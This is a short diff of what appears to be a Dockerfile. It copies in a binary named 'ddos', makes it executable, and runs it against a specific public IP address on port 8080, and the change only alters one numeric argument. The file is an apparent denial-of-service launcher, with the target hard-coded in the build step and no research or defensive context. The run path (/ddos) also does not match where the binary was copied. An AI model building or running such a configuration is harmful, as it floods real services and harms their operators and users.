@@ -11,4 +11,4 @@ RUN apt-get update && apt-get upgrade -y
 ADD ./ddos/ddos /tmp/ddos/ddos
 
 RUN chmod +x /tmp/ddos/ddos
-RUN /ddos eth0 4 128.140.50.44 8080 1000
+RUN /ddos eth0 4 128.140.50.44 8080 100
